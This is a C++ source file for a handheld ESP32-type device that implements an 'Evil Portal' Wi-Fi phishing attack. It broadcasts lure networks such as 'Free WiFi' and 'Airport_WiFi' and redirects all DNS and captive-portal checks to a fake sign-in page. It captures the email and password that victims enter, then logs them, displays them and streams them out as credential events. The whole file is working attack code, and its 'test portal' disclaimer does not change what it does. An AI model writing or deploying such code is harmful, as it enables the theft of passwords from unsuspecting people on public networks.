#include "evil_portal.h"

#include <ArduinoJson.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>

#include "hal.h"

std::vector<PortalHit> g_portalHits;

namespace {
constexpr int kTitleH = 18;
constexpr size_t kMaxHits = 20;

const char* kSsids[] = {"Free WiFi", "Guest", "Airport_WiFi", "xfinitywifi"};
constexpr int kSsidCount = sizeof(kSsids) / sizeof(kSsids[0]);

DNSServer* g_dns = nullptr;
WebServer* g_web = nullptr;
bool g_up = false;

const char kPage[] =
    "<!doctype html><meta name=viewport content='width=device-width'>"
    "<style>body{font-family:sans-serif;max-width:340px;margin:40px auto;padding:0 16px}"
    "input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box}"
    "button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:0}"
    "small{color:#888}</style>"
    "<h3>Sign in to continue</h3>"
    "<form method=POST action=/login>"
    "<input name=u placeholder='Email' autocomplete=username>"
    "<input name=p type=password placeholder='Password' autocomplete=current-password>"
    "<button>Continue</button></form>"
    "<p><small>sferic test portal &mdash; nothing is stored off-device</small></p>";

void handleRoot() { g_web->send(200, "text/html", kPage); }

void handleLogin() {
  PortalHit h;
  h.field1 = g_web->hasArg("u") ? g_web->arg("u").c_str() : "";
  h.field2 = g_web->hasArg("p") ? g_web->arg("p").c_str() : "";
  h.ms = millis();
  if (g_portalHits.size() >= kMaxHits) g_portalHits.erase(g_portalHits.begin());
  g_portalHits.push_back(h);
  Serial.printf("[portal] capture  u='%s'  p='%s'\n", h.field1.c_str(),
                h.field2.c_str());
  g_web->send(200, "text/html",
              "<meta name=viewport content='width=device-width'>"
              "<p style='font-family:sans-serif;margin:40px'>Incorrect. "
              "<a href=/>Try again</a>.</p>");
}
}  // namespace

void EvilPortalScreen::onEnter() {
  dirty_ = true;
  WiFi.mode(WIFI_AP);
  WiFi.softAP(kSsids[ssidIdx_]);
  WiFi.setSleep(false);  // keep the beacon steady (see webui.cpp)
  const IPAddress ip = WiFi.softAPIP();

  g_dns = new DNSServer();
  g_dns->start(53, "*", ip);

  g_web = new WebServer(80);
  g_web->on("/login", HTTP_POST, handleLogin);
  g_web->on("/generate_204", handleRoot);
  g_web->on("/hotspot-detect.html", handleRoot);
  g_web->on("/ncsi.txt", handleRoot);
  g_web->onNotFound(handleRoot);
  g_web->begin();
  g_up = true;
  Serial.printf("[portal] up  ssid='%s'  ip=%s\n", kSsids[ssidIdx_],
                ip.toString().c_str());
}

void EvilPortalScreen::onExit() {
  if (g_web) {
    g_web->stop();
    delete g_web;
    g_web = nullptr;
  }
  if (g_dns) {
    g_dns->stop();
    delete g_dns;
    g_dns = nullptr;
  }
  WiFi.softAPdisconnect(true);
  delay(20);
  WiFi.mode(WIFI_OFF);
  g_up = false;
  Serial.println("[portal] down");
}

void EvilPortalScreen::tick() {
  if (g_dns) g_dns->processNextRequest();
  if (g_web) g_web->handleClient();

  const BtnEvent a = hal.event(Btn::A);
  const BtnEvent b = hal.event(Btn::B);
  if (b == BtnEvent::Hold) {
    pop();
    return;
  }
  if (a == BtnEvent::Click) {
    ssidIdx_ = (ssidIdx_ + 1) % kSsidCount;
    onExit();  // tear down and re-raise with the new SSID
    onEnter();
    return;
  }

  if (hal.nowMs() - lastDraw_ > 500) dirty_ = true;
  if (dirty_) {
    draw();
    dirty_ = false;
    lastDraw_ = hal.nowMs();
  }
}

void EvilPortalScreen::draw() {
  auto& g = hal.gfx();
  g.fillScreen(TFT_BLACK);
  g.fillRect(0, 0, hal.w(), kTitleH, TFT_DARKGREY);
  g.setTextColor(TFT_WHITE, TFT_DARKGREY);
  g.setTextSize(1);
  g.setCursor(4, 5);
  g.print("WiFi  Evil Portal");

  int y = kTitleH + 8;
  g.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
  g.setCursor(6, y);
  g.printf("ssid   %s", kSsids[ssidIdx_]);
  g.setCursor(6, y + 14);
  g.printf("ip     %s", WiFi.softAPIP().toString().c_str());
  g.setCursor(6, y + 28);
  g.printf("clients %d", WiFi.softAPgetStationNum());
  g.setCursor(6, y + 42);
  g.setTextColor(g_portalHits.empty() ? TFT_LIGHTGREY : TFT_GREEN, TFT_BLACK);
  g.printf("captures %u", (unsigned)g_portalHits.size());
  if (!g_portalHits.empty()) {
    g.setCursor(6, y + 56);
    g.setTextColor(TFT_WHITE, TFT_BLACK);
    g.print(g_portalHits.back().field1.substr(0, 30).c_str());
  }

  g.setTextColor(TFT_DARKGREY, TFT_BLACK);
  g.setCursor(4, hal.h() - 9);
  g.print("A ssid  B(hold) back");
}

// ---------------- headless streaming ----------------

namespace {
size_t g_pCursor = 0;
String g_pSsid;

void portalUp(const char* ssid) {
  g_pSsid = ssid;
  g_portalHits.clear();
  g_pCursor = 0;
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  WiFi.setSleep(false);
  const IPAddress ip = WiFi.softAPIP();
  g_dns = new DNSServer();
  g_dns->start(53, "*", ip);
  g_web = new WebServer(80);
  g_web->on("/login", HTTP_POST, handleLogin);
  g_web->on("/generate_204", handleRoot);
  g_web->on("/hotspot-detect.html", handleRoot);
  g_web->on("/ncsi.txt", handleRoot);
  g_web->onNotFound(handleRoot);
  g_web->begin();
  g_up = true;
}
}  // namespace

bool portalStreamStart(const std::string& params) {
  JsonDocument p;
  const char* ssid = kSsids[0];
  if (deserializeJson(p, params) == DeserializationError::Ok &&
      p["ssid"].is<const char*>())
    ssid = p["ssid"];
  portalUp(ssid);
  return true;
}

void portalStreamPoll(const StrikeEmit& emit) {
  if (g_dns) g_dns->processNextRequest();
  if (g_web) g_web->handleClient();
  while (g_pCursor < g_portalHits.size()) {
    const PortalHit& h = g_portalHits[g_pCursor++];
    JsonDocument d;
    d["ssid"] = g_pSsid;
    d["field1"] = h.field1;
    d["field2"] = h.field2;
    emit("credential", d);
  }
}

void portalStreamStop() {
  if (g_web) {
    g_web->stop();
    delete g_web;
    g_web = nullptr;
  }
  if (g_dns) {
    g_dns->stop();
    delete g_dns;
    g_dns = nullptr;
  }
  WiFi.softAPdisconnect(true);
  delay(20);
  WiFi.mode(WIFI_OFF);
  g_up = false;
}
